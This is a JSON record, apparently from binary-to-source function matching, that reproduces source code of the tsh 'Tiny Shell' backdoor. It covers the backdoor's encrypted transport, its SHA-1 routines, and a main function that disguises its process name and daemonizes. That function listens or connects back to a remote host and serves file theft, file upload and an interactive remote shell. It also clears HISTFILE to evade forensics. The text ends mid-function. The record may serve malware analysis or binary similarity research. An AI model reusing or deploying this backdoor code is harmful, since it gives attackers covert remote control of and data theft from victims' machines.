{"file_sha256":"289616b59a145e2033baddb8a8a9b5a8fb01bdbba1b8cf9acadcdd92e6cc0562","base_addr":4294967296,"functions":{"4294978028":{"score":0.9557784,"function_name":"pel_send_all","code":"int pel_send_all( int s, void *buf, size_t len, int flags )\n{\n    int n;\n    size_t sum = 0;\n    char *offset = buf;\n\n    while( sum \u003c len )\n    {\n        n = send( s, (void *) offset, len - sum, flags );\n\n        if( n \u003c 0 )\n        {\n            pel_errno = PEL_SYSTEM_ERROR;\n\n            return( PEL_FAILURE );\n        }\n\n        sum += n;\n\n        offset += n;\n    }\n\n    pel_errno = PEL_UNDEFINED_ERROR;\n\n    return( PEL_SUCCESS );\n}","filepath":"pel.c","line_number":398,"entry_url":"https://github.com/orangetw/tsh.git","slot_name":"8680eb2"},"4294978168":{"score":0.904901,"function_name":"pel_setup_context","code":"void pel_setup_context( struct pel_context *pel_ctx,\n                        char *key, unsigned char IV[20] )\n{\n    int i;\n    struct sha1_context sha1_ctx;\n\n    sha1_starts( \u0026sha1_ctx );\n    sha1_update( \u0026sha1_ctx, (uint8 *) key, strlen( key ) );\n    sha1_update( \u0026sha1_ctx, IV, 20 );\n    sha1_finish( \u0026sha1_ctx, buffer );\n\n    aes_set_key( \u0026pel_ctx-\u003eSK, buffer, 128 );\n\n    memcpy( pel_ctx-\u003eLCT, IV, 16 );\n\n    memset( pel_ctx-\u003ek_ipad, 0x36, 64 );\n    memset( pel_ctx-\u003ek_opad, 0x5C, 64 );\n\n    for( i = 0; i \u003c 20; i++ )\n    {\n        pel_ctx-\u003ek_ipad[i] ^= buffer[i];\n        pel_ctx-\u003ek_opad[i] ^= buffer[i];\n    }\n\n    pel_ctx-\u003ep_cntr = 0;\n}","filepath":"pel.c","line_number":178,"entry_url":"https://github.com/orangetw/tsh.git","slot_name":"8680eb2"},"4294978444":{"score":0.79964375,"function_name":"pel_send_msg","code":"int pel_send_msg( int sockfd, unsigned char *msg, int length )\n{\n    unsigned char digest[20];\n    struct sha1_context sha1_ctx;\n    int i, j, ret, blk_len;\n\n    /* verify the message length */\n\n    if( length \u003c= 0 || length \u003e BUFSIZE )\n    {\n        pel_errno = PEL_BAD_MSG_LENGTH;\n\n        return( PEL_FAILURE );\n    }\n\n    /* write the message length at start of buffer */\n\n    buffer[0] = ( length \u003e\u003e 8 ) \u0026 0xFF;\n    buffer[1] = ( length      ) \u0026 0xFF;\n\n    /* append the message content */\n\n    memcpy( buffer + 2, msg, length );\n\n    /* round up to AES block length (16 bytes) */\n\n    blk_len = 2 + length;\n\n    if( ( blk_len \u0026 0x0F ) != 0 )\n    {\n        blk_len += 16 - ( blk_len \u0026 0x0F );\n    }\n\n    /* encrypt the buffer with AES-CBC-128 */\n\n    for( i = 0; i \u003c blk_len; i += 16 )\n    {\n        for( j = 0; j \u003c 16; j++ )\n        {\n            buffer[i + j] ^= send_ctx.LCT[j];\n        }\n\n        aes_encrypt( \u0026send_ctx.SK, \u0026buffer[i] );\n\n        memcpy( send_ctx.LCT, \u0026buffer[i], 16 );\n    }\n\n    /* compute the HMAC-SHA1 of the ciphertext */\n\n    buffer[blk_len    ] = ( send_ctx.p_cntr \u003c\u003c 24 ) \u0026 0xFF;\n    buffer[blk_len + 1] = ( send_ctx.p_cntr \u003c\u003c 16 ) \u0026 0xFF;\n    buffer[blk_len + 2] = ( send_ctx.p_cntr \u003c\u003c  8 ) \u0026 0xFF;\n    buffer[blk_len + 3] = ( send_ctx.p_cntr       ) \u0026 0xFF;\n\n    sha1_starts( \u0026sha1_ctx );\n    sha1_update( \u0026sha1_ctx, send_ctx.k_ipad, 64 );\n    sha1_update( \u0026sha1_ctx, buffer, blk_len + 4 );\n    sha1_finish( \u0026sha1_ctx, digest );\n\n    sha1_starts( \u0026sha1_ctx );\n    sha1_update( \u0026sha1_ctx, send_ctx.k_opad, 64 );\n    sha1_update( \u0026sha1_ctx, digest, 20 );\n    sha1_finish( \u0026sha1_ctx, \u0026buffer[blk_len] );\n\n    /* increment the packet counter */\n\n    send_ctx.p_cntr++;\n\n    /* transmit ciphertext and message authentication code */\n\n    ret = pel_send_all( sockfd, buffer, blk_len + 20, 0 );\n\n    if( ret != PEL_SUCCESS ) return( PEL_FAILURE );\n\n    pel_errno = PEL_UNDEFINED_ERROR;\n\n    return( PEL_SUCCESS );\n}","filepath":"pel.c","line_number":207,"entry_url":"https://github.com/orangetw/tsh.git","slot_name":"8680eb2"},"4294978944":{"score":0.7982944,"function_name":"pel_recv_msg","code":"int pel_recv_msg( int sockfd, unsigned char *msg, int *length )\n{\n    unsigned char temp[16];\n    unsigned char hmac[20];\n    unsigned char digest[20];\n    struct sha1_context sha1_ctx;\n    int i, j, ret, blk_len;\n\n    /* receive the first encrypted block */\n\n    ret = pel_recv_all( sockfd, buffer, 16, 0 );\n\n    if( ret != PEL_SUCCESS ) return( PEL_FAILURE );\n\n    /* decrypt this block and extract the message length */\n\n    memcpy( temp, buffer, 16 );\n\n    aes_decrypt( \u0026recv_ctx.SK, buffer );\n\n    for( j = 0; j \u003c 16; j++ )\n    {\n        buffer[j] ^= recv_ctx.LCT[j];\n    }\n\n    *length = ( ((int) buffer[0]) \u003c\u003c 8 ) + (int) buffer[1];\n\n    /* restore the ciphertext */\n\n    memcpy( buffer, temp, 16 );\n\n    /* verify the message length */\n\n    if( *length \u003c= 0 || *length \u003e BUFSIZE )\n    {\n        pel_errno = PEL_BAD_MSG_LENGTH;\n\n        return( PEL_FAILURE );\n    }\n\n    /* round up to AES block length (16 bytes) */\n\n    blk_len = 2 + *length;\n\n    if( ( blk_len \u0026 0x0F ) != 0 )\n    {\n        blk_len += 16 - ( blk_len \u0026 0x0F );\n    }\n\n    /* receive the remaining ciphertext and the mac */\n\n    ret = pel_recv_all( sockfd, \u0026buffer[16], blk_len - 16 + 20, 0 );\n\n    if( ret != PEL_SUCCESS ) return( PEL_FAILURE );\n\n    memcpy( hmac, \u0026buffer[blk_len], 20 );\n\n    /* verify the ciphertext integrity */\n\n    buffer[blk_len    ] = ( recv_ctx.p_cntr \u003c\u003c 24 ) \u0026 0xFF;\n    buffer[blk_len + 1] = ( recv_ctx.p_cntr \u003c\u003c 16 ) \u0026 0xFF;\n    buffer[blk_len + 2] = ( recv_ctx.p_cntr \u003c\u003c  8 ) \u0026 0xFF;\n    buffer[blk_len + 3] = ( recv_ctx.p_cntr       ) \u0026 0xFF;\n\n    sha1_starts( \u0026sha1_ctx );\n    sha1_update( \u0026sha1_ctx, recv_ctx.k_ipad, 64 );\n    sha1_update( \u0026sha1_ctx, buffer, blk_len + 4 );\n    sha1_finish( \u0026sha1_ctx, digest );\n\n    sha1_starts( \u0026sha1_ctx );\n    sha1_update( \u0026sha1_ctx, recv_ctx.k_opad, 64 );\n    sha1_update( \u0026sha1_ctx, digest, 20 );\n    sha1_finish( \u0026sha1_ctx, digest );\n\n    if( memcmp( hmac, digest, 20 ) != 0 )\n    {\n        pel_errno = PEL_CORRUPTED_DATA;\n\n        return( PEL_FAILURE );\n    }\n\n    /* increment the packet counter */\n\n    recv_ctx.p_cntr++;\n\n    /* finally, decrypt and copy the message */\n\n    for( i = 0; i \u003c blk_len; i += 16 )\n    {\n        memcpy( temp, \u0026buffer[i], 16 );\n\n        aes_decrypt( \u0026recv_ctx.SK, \u0026buffer[i] );\n\n        for( j = 0; j \u003c 16; j++ )\n        {\n            buffer[i + j] ^= recv_ctx.LCT[j];\n        }\n\n        memcpy( recv_ctx.LCT, temp, 16 );\n    }\n\n    memcpy( msg, \u0026buffer[2], *length );\n\n    pel_errno = PEL_UNDEFINED_ERROR;\n\n    return( PEL_SUCCESS );\n}","filepath":"pel.c","line_number":288,"entry_url":"https://github.com/orangetw/tsh.git","slot_name":"8680eb2"},"4294979636":{"score":0.7144356,"function_name":"pel_server_init","code":"int pel_server_init( int client, char *key )\n{\n    int ret, len;\n    unsigned char IV1[20], IV2[20];\n\n    /* get the IVs from the client */\n\n    ret = pel_recv_all( client, buffer, 40, 0 );\n\n    if( ret != PEL_SUCCESS ) return( PEL_FAILURE );\n\n    memcpy( IV2, \u0026buffer[ 0], 20 );\n    memcpy( IV1, \u0026buffer[20], 20 );\n\n    /* setup the session keys */\n\n    pel_setup_context( \u0026send_ctx, key, IV1 );\n    pel_setup_context( \u0026recv_ctx, key, IV2 );\n\n    /* handshake - decrypt and verify the client's challenge */\n\n    ret = pel_recv_msg( client, buffer, \u0026len );\n\n    if( ret != PEL_SUCCESS ) return( PEL_FAILURE );\n\n    if( len != 16 || memcmp( buffer, challenge, 16 ) != 0 )\n    {\n        pel_errno = PEL_WRONG_CHALLENGE;\n\n        return( PEL_FAILURE );\n    }\n\n    /* handshake - encrypt and send the server's challenge */\n\n    ret = pel_send_msg( client, challenge, 16 );\n\n    if( ret != PEL_SUCCESS ) return( PEL_FAILURE );\n\n    pel_errno = PEL_UNDEFINED_ERROR;\n\n    return( PEL_SUCCESS );\n}","filepath":"pel.c","line_number":133,"entry_url":"https://github.com/orangetw/tsh.git","slot_name":"8680eb2"},"4294979972":{"score":0.94920784,"function_name":"pel_recv_all","code":"int pel_recv_all( int s, void *buf, size_t len, int flags )\n{\n    int n;\n    size_t sum = 0;\n    char *offset = buf;\n\n    while( sum \u003c len )\n    {\n        n = recv( s, (void *) offset, len - sum, flags );\n\n        if( n == 0 )\n        {\n            pel_errno = PEL_CONN_CLOSED;\n\n            return( PEL_FAILURE );\n        }\n\n        if( n \u003c 0 )\n        {\n            pel_errno = PEL_SYSTEM_ERROR;\n\n            return( PEL_FAILURE );\n        }\n\n        sum += n;\n\n        offset += n;\n    }\n        \n    pel_errno = PEL_UNDEFINED_ERROR;\n\n    return( PEL_SUCCESS );\n}","filepath":"pel.c","line_number":425,"entry_url":"https://github.com/orangetw/tsh.git","slot_name":"8680eb2"},"4294987372":{"score":0.92711174,"function_name":"sha1_starts","code":"void sha1_starts( struct sha1_context *ctx )\n{\n    ctx-\u003etotal[0] = 0;\n    ctx-\u003etotal[1] = 0;\n    ctx-\u003estate[0] = 0x67452301;\n    ctx-\u003estate[1] = 0xEFCDAB89;\n    ctx-\u003estate[2] = 0x98BADCFE;\n    ctx-\u003estate[3] = 0x10325476;\n    ctx-\u003estate[4] = 0xC3D2E1F0;\n}","filepath":"sha1.c","line_number":26,"entry_url":"https://github.com/orangetw/tsh.git","slot_name":"8680eb2"},"4294987432":{"score":0.7606352,"function_name":"sha1_process","code":"void sha1_process( struct sha1_context *ctx, uint8 data[64] )\n{\n    uint32 temp, A, B, C, D, E, W[16];\n\n    GET_UINT32( W[0],  data,  0 );\n    GET_UINT32( W[1],  data,  4 );\n    GET_UINT32( W[2],  data,  8 );\n    GET_UINT32( W[3],  data, 12 );\n    GET_UINT32( W[4],  data, 16 );\n    GET_UINT32( W[5],  data, 20 );\n    GET_UINT32( W[6],  data, 24 );\n    GET_UINT32( W[7],  data, 28 );\n    GET_UINT32( W[8],  data, 32 );\n    GET_UINT32( W[9],  data, 36 );\n    GET_UINT32( W[10], data, 40 );\n    GET_UINT32( W[11], data, 44 );\n    GET_UINT32( W[12], data, 48 );\n    GET_UINT32( W[13], data, 52 );\n    GET_UINT32( W[14], data, 56 );\n    GET_UINT32( W[15], data, 60 );\n\n#define S(x,n) ((x \u003c\u003c n) | ((x \u0026 0xFFFFFFFF) \u003e\u003e (32 - n)))\n\n#define R(t)                                            \\\n(                                                       \\\n    temp = W[(t -  3) \u0026 0x0F] ^ W[(t - 8) \u0026 0x0F] ^     \\\n           W[(t - 14) \u0026 0x0F] ^ W[ t      \u0026 0x0F],      \\\n    ( W[t \u0026 0x0F] = S(temp,1) )                         \\\n)\n\n#define P(a,b,c,d,e,x)                                  \\\n{                                                       \\\n    e += S(a,5) + F(b,c,d) + K + x; b = S(b,30);        \\\n}\n\n    A = ctx-\u003estate[0];\n    B = ctx-\u003estate[1];\n    C = ctx-\u003estate[2];\n    D = ctx-\u003estate[3];\n    E = ctx-\u003estate[4];\n\n#define F(x,y,z) (z ^ (x \u0026 (y ^ z)))\n#define K 0x5A827999\n\n    P( A, B, C, D, E, W[0]  );\n    P( E, A, B, C, D, W[1]  );\n    P( D, E, A, B, C, W[2]  );\n    P( C, D, E, A, B, W[3]  );\n    P( B, C, D, E, A, W[4]  );\n    P( A, B, C, D, E, W[5]  );\n    P( E, A, B, C, D, W[6]  );\n    P( D, E, A, B, C, W[7]  );\n    P( C, D, E, A, B, W[8]  );\n    P( B, C, D, E, A, W[9]  );\n    P( A, B, C, D, E, W[10] );\n    P( E, A, B, C, D, W[11] );\n    P( D, E, A, B, C, W[12] );\n    P( C, D, E, A, B, W[13] );\n    P( B, C, D, E, A, W[14] );\n    P( A, B, C, D, E, W[15] );\n    P( E, A, B, C, D, R(16) );\n    P( D, E, A, B, C, R(17) );\n    P( C, D, E, A, B, R(18) );\n    P( B, C, D, E, A, R(19) );\n\n#undef K\n#undef F\n\n#define F(x,y,z) (x ^ y ^ z)\n#define K 0x6ED9EBA1\n\n    P( A, B, C, D, E, R(20) );\n    P( E, A, B, C, D, R(21) );\n    P( D, E, A, B, C, R(22) );\n    P( C, D, E, A, B, R(23) );\n    P( B, C, D, E, A, R(24) );\n    P( A, B, C, D, E, R(25) );\n    P( E, A, B, C, D, R(26) );\n    P( D, E, A, B, C, R(27) );\n    P( C, D, E, A, B, R(28) );\n    P( B, C, D, E, A, R(29) );\n    P( A, B, C, D, E, R(30) );\n    P( E, A, B, C, D, R(31) );\n    P( D, E, A, B, C, R(32) );\n    P( C, D, E, A, B, R(33) );\n    P( B, C, D, E, A, R(34) );\n    P( A, B, C, D, E, R(35) );\n    P( E, A, B, C, D, R(36) );\n    P( D, E, A, B, C, R(37) );\n    P( C, D, E, A, B, R(38) );\n    P( B, C, D, E, A, R(39) );\n\n#undef K\n#undef F\n\n#define F(x,y,z) ((x \u0026 y) | (z \u0026 (x | y)))\n#define K 0x8F1BBCDC\n\n    P( A, B, C, D, E, R(40) );\n    P( E, A, B, C, D, R(41) );\n    P( D, E, A, B, C, R(42) );\n    P( C, D, E, A, B, R(43) );\n    P( B, C, D, E, A, R(44) );\n    P( A, B, C, D, E, R(45) );\n    P( E, A, B, C, D, R(46) );\n    P( D, E, A, B, C, R(47) );\n    P( C, D, E, A, B, R(48) );\n    P( B, C, D, E, A, R(49) );\n    P( A, B, C, D, E, R(50) );\n    P( E, A, B, C, D, R(51) );\n    P( D, E, A, B, C, R(52) );\n    P( C, D, E, A, B, R(53) );\n    P( B, C, D, E, A, R(54) );\n    P( A, B, C, D, E, R(55) );\n    P( E, A, B, C, D, R(56) );\n    P( D, E, A, B, C, R(57) );\n    P( C, D, E, A, B, R(58) );\n    P( B, C, D, E, A, R(59) );\n\n#undef K\n#undef F\n\n#define F(x,y,z) (x ^ y ^ z)\n#define K 0xCA62C1D6\n\n    P( A, B, C, D, E, R(60) );\n    P( E, A, B, C, D, R(61) );\n    P( D, E, A, B, C, R(62) );\n    P( C, D, E, A, B, R(63) );\n    P( B, C, D, E, A, R(64) );\n    P( A, B, C, D, E, R(65) );\n    P( E, A, B, C, D, R(66) );\n    P( D, E, A, B, C, R(67) );\n    P( C, D, E, A, B, R(68) );\n    P( B, C, D, E, A, R(69) );\n    P( A, B, C, D, E, R(70) );\n    P( E, A, B, C, D, R(71) );\n    P( D, E, A, B, C, R(72) );\n    P( C, D, E, A, B, R(73) );\n    P( B, C, D, E, A, R(74) );\n    P( A, B, C, D, E, R(75) );\n    P( E, A, B, C, D, R(76) );\n    P( D, E, A, B, C, R(77) );\n    P( C, D, E, A, B, R(78) );\n    P( B, C, D, E, A, R(79) );\n\n#undef K\n#undef F\n\n    ctx-\u003estate[0] += A;\n    ctx-\u003estate[1] += B;\n    ctx-\u003estate[2] += C;\n    ctx-\u003estate[3] += D;\n    ctx-\u003estate[4] += E;\n}","filepath":"sha1.c","line_number":37,"entry_url":"https://github.com/orangetw/tsh.git","slot_name":"8680eb2"},"4294992460":{"score":0.7967044,"function_name":"sha1_update","code":"void sha1_update( struct sha1_context *ctx, uint8 *input, uint32 length )\n{\n    uint32 left, fill;\n\n    if( ! length ) return;\n\n    left = ( ctx-\u003etotal[0] \u003e\u003e 3 ) \u0026 0x3F;\n    fill = 64 - left;\n\n    ctx-\u003etotal[0] += length \u003c\u003c  3;\n    ctx-\u003etotal[1] += length \u003e\u003e 29;\n\n    ctx-\u003etotal[0] \u0026= 0xFFFFFFFF;\n    ctx-\u003etotal[1] += ctx-\u003etotal[0] \u003c ( length \u003c\u003c 3 );\n\n    if( left \u0026\u0026 length \u003e= fill )\n    {\n        memcpy( (void *) (ctx-\u003ebuffer + left), (void *) input, fill );\n        sha1_process( ctx, ctx-\u003ebuffer );\n        length -= fill;\n        input  += fill;\n        left = 0;\n    }\n\n    while( length \u003e= 64 )\n    {\n        sha1_process( ctx, input );\n        length -= 64;\n        input  += 64;\n    }\n\n    if( length )\n    {\n        memcpy( (void *) (ctx-\u003ebuffer + left), (void *) input, length );\n    }\n}","filepath":"sha1.c","line_number":193,"entry_url":"https://github.com/orangetw/tsh.git","slot_name":"8680eb2"},"4294992672":{"score":0.7857576,"function_name":"sha1_finish","code":"void sha1_finish( struct sha1_context *ctx, uint8 digest[20] )\n{\n    uint32 last, padn;\n    uint8 msglen[8];\n\n    PUT_UINT32( ctx-\u003etotal[1], msglen, 0 );\n    PUT_UINT32( ctx-\u003etotal[0], msglen, 4 );\n\n    last = ( ctx-\u003etotal[0] \u003e\u003e 3 ) \u0026 0x3F;\n    padn = ( last \u003c 56 ) ? ( 56 - last ) : ( 120 - last );\n\n    sha1_update( ctx, sha1_padding, padn );\n    sha1_update( ctx, msglen, 8 );\n\n    PUT_UINT32( ctx-\u003estate[0], digest,  0 );\n    PUT_UINT32( ctx-\u003estate[1], digest,  4 );\n    PUT_UINT32( ctx-\u003estate[2], digest,  8 );\n    PUT_UINT32( ctx-\u003estate[3], digest, 12 );\n    PUT_UINT32( ctx-\u003estate[4], digest, 16 );\n}","filepath":"sha1.c","line_number":238,"entry_url":"https://github.com/orangetw/tsh.git","slot_name":"8680eb2"},"4294993048":{"score":0.8517857,"function_name":"main","code":"int main( int argc,char **argv )\n{\n    int ret, len, pid, n;\n\n#ifndef CONNECT_BACK_HOST\n\n    int client, server;\n    struct sockaddr_in server_addr;\n    struct sockaddr_in client_addr;\n\n#else\n\n    int client;\n    struct sockaddr_in client_addr;\n    struct hostent *client_host;\n\n#endif\n    /* overwrite cmdline */\n    memset((void *)argv[0], '\\0', strlen(argv[0]));\n    strcpy(argv[0], FAKE_PROC_NAME);\n\n    /* fork into background */\n\n    pid = fork();\n\n    if( pid \u003c 0 )\n    {\n        return( 1 );\n    }\n\n    if( pid != 0 )\n    {\n        return( 0 );\n    }\n\n    /* create a new session */\n\n    if( setsid() \u003c 0 )\n    {\n        return( 2 );\n    }\n\n    /* close all file descriptors */\n\n    for( n = 0; n \u003c 1024; n++ )\n    {\n        close( n );\n    }\n\n#ifndef CONNECT_BACK_HOST\n\n    /* create a socket */\n\n    server = socket( AF_INET, SOCK_STREAM, 0 );\n\n    if( server \u003c 0 )\n    {\n        return( 3 );\n    }\n\n    /* bind the server on the port the client will connect to */    \n\n    n = 1;\n\n    ret = setsockopt( server, SOL_SOCKET, SO_REUSEADDR,\n                      (void *) \u0026n, sizeof( n ) );\n\n    if( ret \u003c 0 )\n    {\n        return( 4 );\n    }\n\n    server_addr.sin_family      = AF_INET;\n    server_addr.sin_port        = htons( SERVER_PORT );\n    server_addr.sin_addr.s_addr = INADDR_ANY;\n\n    ret = bind( server, (struct sockaddr *) \u0026server_addr,\n                sizeof( server_addr ) );\n\n    if( ret \u003c 0 )\n    {\n        return( 5 );\n    }\n\n    if( listen( server, 5 ) \u003c 0 )\n    {\n        return( 6 );\n    }\n\n    while( 1 )\n    {\n        /* wait for inboud connections */\n\n        n = sizeof( client_addr );\n\n        client = accept( server, (struct sockaddr *)\n                         \u0026client_addr, \u0026n );\n\n        if( client \u003c 0 )\n        {\n            return( 7 );\n        }\n\n#else\n\n    while( 1 )\n    {\n        sleep( CONNECT_BACK_DELAY );\n\n        /* create a socket */\n\n        client = socket( AF_INET, SOCK_STREAM, 0 );\n\n        if( client \u003c 0 )\n        {\n            continue;\n        }\n\n        /* resolve the client hostname */\n\n        client_host = gethostbyname( CONNECT_BACK_HOST );\n\n        if( client_host == NULL )\n        {\n            continue;\n        }\n\n        memcpy( (void *) \u0026client_addr.sin_addr,\n                (void *) client_host-\u003eh_addr,\n                client_host-\u003eh_length );\n\n        client_addr.sin_family = AF_INET;\n        client_addr.sin_port   = htons( SERVER_PORT );\n\n        /* try to connect back to the client */\n\n        ret = connect( client, (struct sockaddr *) \u0026client_addr,\n                       sizeof( client_addr ) );\n\n        if( ret \u003c 0 )\n        {\n            close( client );\n            continue;\n        }\n\n#endif\n\n        /* fork a child to handle the connection */\n\n        pid = fork();\n\n        if( pid \u003c 0 )\n        {\n            close( client );\n            continue;\n        }\n\n        if( pid != 0 )\n        {\n            waitpid( pid, NULL, 0 );\n            close( client );\n            continue;\n        }\n\n#ifndef CONNECT_BACK_HOST\n\n        /* child doesn't need the server socket */\n\n        close( server );\n\n#endif\n\n        /* the child forks and then exits so that the grand-child's\n         * father becomes init (this to avoid becoming a zombie) */\n\n        pid = fork();\n\n        if( pid \u003c 0 )\n        {\n            return( 8 );\n        }\n\n        if( pid != 0 )\n        {\n            return( 9 );\n        }\n\n        /* setup the packet encryption layer */\n\n        alarm( 3 );\n\n        ret = pel_server_init( client, secret );\n\n        if( ret != PEL_SUCCESS )\n        {\n            shutdown( client, 2 );\n            return( 10 );\n        }\n\n        alarm( 0 );\n\n        /* get the action requested by the client */\n\n        ret = pel_recv_msg( client, message, \u0026len );\n\n        if( ret != PEL_SUCCESS || len != 1 )\n        {\n            shutdown( client, 2 );\n            return( 11 );\n        }\n\n        /* howdy */\n\n        switch( message[0] )\n        {\n            case GET_FILE:\n\n                ret = tshd_get_file( client );\n                break;\n\n            case PUT_FILE:\n\n                ret = tshd_put_file( client );\n                break;\n\n            case RUNSHELL:\n\n                ret = tshd_runshell( client );\n                break;\n\n            default:\n                \n                ret = 12;\n                break;\n        }\n\n        shutdown( client, 2 );\n        return( ret );\n    }\n\n    /* not reached */\n\n    return( 13 );\n}\n\nint tshd_get_file( int client )\n{\n    int ret, len, fd;\n\n    /* get the filename */\n\n    ret = pel_recv_msg( client, message, \u0026len );\n\n    if( ret != PEL_SUCCESS )\n    {\n        return( 14 );\n    }\n\n    message[len] = '\\0';\n\n    /* open local file */\n\n    fd = open( (char *) message, O_RDONLY );\n\n    if( fd \u003c 0 )\n    {\n        return( 15 );\n    }\n\n    /* send the data */\n\n    while( 1 )\n    {\n        len = read( fd, message, BUFSIZE );\n\n        if( len == 0 ) break;\n\n        if( len \u003c 0 )\n        {\n            return( 16 );\n        }\n\n        ret = pel_send_msg( client, message, len );\n\n        if( ret != PEL_SUCCESS )\n        {\n            return( 17 );\n        }\n    }\n\n    return( 18 );\n}\n\nint tshd_put_file( int client )\n{\n    int ret, len, fd;\n\n    /* get the filename */\n\n    ret = pel_recv_msg( client, message, \u0026len );\n\n    if( ret != PEL_SUCCESS )\n    {\n        return( 19 );\n    }\n\n    message[len] = '\\0';\n\n    /* create local file */\n\n    fd = creat( (char *) message, 0644 );\n\n    if( fd \u003c 0 )\n    {\n        return( 20 );\n    }\n\n    /* fetch the data */\n\n    while( 1 )\n    {\n        ret = pel_recv_msg( client, message, \u0026len );\n\n        if( ret != PEL_SUCCESS )\n        {\n            if( pel_errno == PEL_CONN_CLOSED )\n            {\n                break;\n            }\n\n            return( 21 );\n        }\n\n        if( write( fd, message, len ) != len )\n        {\n            return( 22 );\n        }\n    }\n\n    return( 23 );\n}\n\nint tshd_runshell( int client )\n{\n    fd_set rd;\n    struct winsize ws;\n    char *slave, *temp, *shell;\n    int ret, len, pid, pty, tty, n;\n\n    /* request a pseudo-terminal */\n\n#if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF\n\n    if( openpty( \u0026pty, \u0026tty, NULL, NULL, NULL ) \u003c 0 )\n    {\n        return( 24 );\n    }\n\n    slave = ttyname( tty );\n\n    if( slave == NULL )\n    {\n        return( 25 );\n    }\n\n#else\n#if defined IRIX\n\n    slave = _getpty( \u0026pty, O_RDWR, 0622, 0 );\n\n    if( slave == NULL )\n    {\n        return( 26 );\n    }\n\n    tty = open( slave, O_RDWR | O_NOCTTY );\n\n    if( tty \u003c 0 )\n    {\n        return( 27 );\n    }\n\n#else\n#if defined CYGWIN || defined SUNOS || defined HPUX\n\n    pty = open( \"/dev/ptmx\", O_RDWR | O_NOCTTY );\n\n    if( pty \u003c 0 )\n    {\n        return( 28 );\n    }\n\n    if( grantpt( pty ) \u003c 0 )\n    {\n        return( 29 );\n    }\n\n    if( unlockpt( pty ) \u003c 0 )\n    {\n        return( 30 );\n    }\n\n    slave = ptsname( pty );\n\n    if( slave == NULL )\n    {\n        return( 31 );\n    }\n\n    tty = open( slave, O_RDWR | O_NOCTTY );\n\n    if( tty \u003c 0 )\n    {\n        return( 32 );\n    }\n\n#if defined SUNOS || defined HPUX\n\n    if( ioctl( tty, I_PUSH, \"ptem\" ) \u003c 0 )\n    {\n        return( 33 );\n    }\n\n    if( ioctl( tty, I_PUSH, \"ldterm\" ) \u003c 0 )\n    {\n        return( 34 );\n    }\n\n#if defined SUNOS\n\n    if( ioctl( tty, I_PUSH, \"ttcompat\" ) \u003c 0 )\n    {\n        return( 35 );\n    }\n\n#endif\n#endif\n#endif\n#endif\n#endif\n\n    /* just in case bash is run, kill the history file */\n\n    temp = (char *) malloc( 10 );\n\n    if( temp == NULL )\n    {\n        return( 36 );\n    }\n\n    temp[0] = 'H'; temp[5] = 'I';\n    temp[1] = 'I'; temp[6] = 'L';\n    temp[2] = 'S'; temp[7] = 'E';\n    temp[3] = 'T'; temp[8] = '=';\n    temp[4] = 'F'; temp[9] = '\\0';\n\n    putenv( temp );\n\n    /* get the TERM environment variable */\n\n    ret = pel_recv_msg( client, message, \u0026len );\n\n    if( ret != PEL_SUCCESS )\n    {\n        return( 37 );\n    }\n\n    message[len] = '\\0';\n\n    temp = (char *) malloc( len + 6 );\n\n    if( temp == NULL )\n    {\n        return( 38 );\n    }\n\n    temp[0] = 'T'; temp[3] = 'M';\n    temp[1] = 'E'; temp[4] = '=';\n    temp[2] = 'R';\n\n    strncpy( temp + 5, (char *) message, len + 1 );\n\n    putenv( temp );\n\n    /* get the window size */\n\n    ret = pel_recv_msg( client, message, \u0026len );\n\n    if( ret != PEL_SUCCESS || len != 4 )\n    {\n        return( 39 );\n    }\n\n    ws.ws_row = ( (int) message[0] \u003c\u003c 8 ) + (int) message[1];\n    ws.ws_col = ( (int) message[2] \u003c\u003c 8 ) + (int) message[3];\n\n    ws.ws_xpixel = 0;\n    ws.ws_ypixel = 0;\n\n    if( ioctl( pty, TIOCSWINSZ, \u0026ws ) \u003c 0 )\n    {\n        return( 40 );\n    }\n\n    /* get the system command */\n\n    ret = pel_recv_msg( client, message, \u0026len );\n\n    if( ret != PEL_SUCCESS )\n    {\n        return( 41 );\n    }\n\n    message[len] = '\\0';\n\n    temp = (char *) malloc( len + 1 );\n\n    if( temp == NULL )\n    {\n        return( 42 );\n    }\n\n    strncpy( temp, (char *) message, len + 1 );\n\n    /* fork to spawn a shell */\n\n    pid = fork();\n\n    if( pid \u003c 0 )\n    {\n        return( 43 );\n    }\n\n    if( pid == 0 )\n    {\n        /* close the client socket and the pty (master side) */\n\n        close( client );\n        close( pty );\n\n        /* create a new session */\n\n        if( setsid() \u003c 0 )\n        {\n            return( 44 );\n        }\n\n        /* set controlling tty, to have job control */\n\n#if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF\n\n        if( ioctl( tty, TIOCSCTTY, NULL ) \u003c 0 )\n        {\n            return( 45 );\n        }\n\n#else\n#if defined CYGWIN || defined SUNOS || defined IRIX || defined HPUX\n\n        {\n            int fd;\n\n            fd = open( slave, O_RDWR );\n\n            if( fd \u003c 0 )\n            {\n                return( 46 );\n            }\n\n            close( tty );\n\n            tty = fd;\n        }\n\n#endif\n#endif\n\n        /* tty becomes stdin, stdout, stderr */\n\n        dup2( tty, 0 );\n        dup2( tty, 1 );\n        dup2( tty, 2 );\n\n        if( tty \u003e 2 )\n        {\n            close( tty );\n        }\n\n        /* fire up the shell */\n\n        shell = (char *) malloc( 8 );\n\n        if( shell == NULL )\n        {\n            return( 47 );\n        }\n\n        shell[0] = '/'; shell[4] = '/';\n        shell[1] = 'b'; shell[5] = 's';\n        shell[2] = 'i'; shell[6] = 'h';\n        shell[3] = 'n'; shell[7] = '\\0';\n\n        execl( shell, shell + 5, \"-c\", temp, (char *) 0 );\n\n        /* d0h, this shouldn't happen */\n\n        return( 48 );\n    }\n    else\n    {\n        /* tty (slave side) not needed anymore */\n\n        close( tty );\n\n        /* let's forward the data back and forth */\n\n        while( 1 )\n        {\n            FD_ZERO( \u0026rd );\n            FD_SET( client, \u0026rd );\n            FD_SET( pty, \u0026rd );\n\n            n = ( pty \u003e client ) ? pty : client;\n\n            if( select( n + 1, \u0026rd, NULL, NULL, NULL ) \u003c 0 )\n            {\n                return( 49 );\n            }\n\n            if( FD_ISSET( client, \u0026rd ) )\n            {\n                ret = pel_recv_msg( client, message, \u0026len );\n\n                if( ret != PEL_SUCCESS )\n                {\n                    return( 50 );\n                }\n\n                if( write( pty, message, len ) != len )\n                {\n                    return( 51 );\n                }\n            }\n\n            if( FD_ISSET( pty, \u0026rd ) )\n            {\n                len = read( pty, message, BUFSIZE );\n\n                if( len == 0 ) break;\n\n                if( len \u003c 0 )\n                {\n                    return( 52 );\n                }\n\n                ret = 